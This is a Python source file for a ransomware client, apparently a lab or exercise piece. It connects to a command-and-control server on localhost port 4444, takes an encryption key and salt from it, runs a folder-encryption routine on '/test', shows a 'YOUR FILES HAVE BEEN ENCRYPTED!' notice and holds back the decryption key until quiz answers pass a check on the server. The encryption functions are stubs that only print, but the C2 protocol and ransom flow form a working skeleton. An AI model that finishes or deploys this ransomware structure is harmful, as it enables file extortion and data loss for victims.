import os
import base64
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import getpass
import socket
import threading
import enum

class Requests(enum.Enum):
    ENCRYPT = "ENCRYPT"
    CHECK_ANSWERS = "CHECK_ANSWERS"
    ANSWER_VERIFICATION = "ANSWER_VERIFICATION"
    REQUEST_DECRYPTION_KEY = "REQUEST_DECRYPTION_KEY"
    NOT_ENOUGH_CORRECT_ANSWERS = "NOT_ENOUGH_CORRECT_ANSWERS"
    EXIT = "EXIT"

def encrypt_file(file_path: str, cipher: Fernet) -> bool:
    """
    Encrypt a single file using Fernet (AES-256).
    
    Args:
        file_path: Path to the file to encrypt
        cipher: Fernet cipher object
    
    Returns:
        bool: True if successful, False otherwise
    """
    print("Encrypting the file")
    return True

def encrypt_folder(key, salt, folder_path: str, save_salt: bool = True) -> bool:
    """
    Encrypt all files in a given folder using AES-256.
    
    Args:
        key: The encryption key
        salt: The salt for key derivation
        folder_path: Path to the folder containing files to encrypt
        save_salt: Whether to save the salt to a file (for decryption)
    
    Returns:
        bool: True if successful, False otherwise
    """
    print("Encrypting foder")
    return True


def decrypt_folder(folder_path: str, password: str = None, salt_path: str = None) -> bool:
    """
    Decrypt all encrypted files in a given folder.
    
    Args:
        folder_path: Path to the folder containing encrypted files
        password: Password for decryption (if None, prompts user)
        salt_path: Path to the salt file (if None, looks for .salt in folder)
    
    Returns:
        bool: True if successful, False otherwise
    """
    print("Decrypting folder")
    return True


def validate_question(question: str, server_socket: socket):
    while True:
        answer = input(f"{question}\nYour answer: ")
        server_socket.send(f"{Requests.CHECK_ANSWERS.value}:{question}:{answer}".encode())
        response = server_socket.recv(1024).decode()
        if response.startswith("ANSWER_VERIFICATION:"):
            verification_result = response.split(":", 1)[1]
        if verification_result == "True":
            print("Correct answer! Let's go for the next question.")
            break
        else:
            print("Incorrect answer. Try again later.")

def questions(server_socket: socket):
    print("YOUR FILES HAVE BEEN ENCRYPTED!")
    print("Answer the following questions to get the decryption key:")
    
    validate_question("What is the capital of France?", server_socket)
    validate_question("What is 2 + 2?", server_socket)
    validate_question("Who is the best hacker in the world?", server_socket)

def handle_server_communication(server_socket: socket):
    """
    Handle communication with the C2 server.
    
    Args:
        client_socket: Socket connected to the C2 server
    """
    try:
        while True:
            server_socket.send(Requests.ENCRYPT.value.encode())
            response = server_socket.recv(1024).decode()
            if not response:
                print("C2 server disconnected.")
                break
            print(f"Received response from C2 server: {response}")
            
            k, s = response.split("::")

            key = base64.b64decode(k)
            salt = base64.b64decode(s)
            
            print("Key:", key)
            print("Salt:", salt)
            #encrypt with the received key and salt
            encrypt_folder(key, salt, "/test", save_salt=False)

            del key
            del salt
            questions(server_socket)

            server_socket.send(Requests.REQUEST_DECRYPTION_KEY.value.encode())
            response = server_socket.recv(1024).decode()
            if response.startswith(Requests.NOT_ENOUGH_CORRECT_ANSWERS.value):
                print("Not enough correct answers to receive the decryption key, too bad :D")
            else:
                k, s = response.split("::")
                key = base64.b64decode(k)
                salt = base64.b64decode(s)
                decrypt_folder("/test", password=None, salt_path=None)
                break
    except Exception as e:
        print(f"Error communicating with C2 server: {str(e)}")
    finally:
        server_socket.close()
        print("Connection to C2 server closed.")

def connect_to_server(server_ip: str, server_port: int):
    """
    Connect to the C2 server and handle communication.
    
    Args:
        server_ip: IP address of the C2 server
        server_port: Port number of the C2 server
    """

    
    # Create a TCP socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # Connect to the server
        server_socket.connect((server_ip, server_port))
        print(f"Connected to C2 server at {server_ip}:{server_port}")
        
        # Handle communication in a separate thread
        threading.Thread(target=handle_server_communication, args=(server_socket,)).start()
        
    except Exception as e:
        print(f"Failed to connect to C2 server: {str(e)}")
        server_socket.close()


# Example usage and testing
if __name__ == "__main__":
    connect_to_server("127.0.0.1", 4444)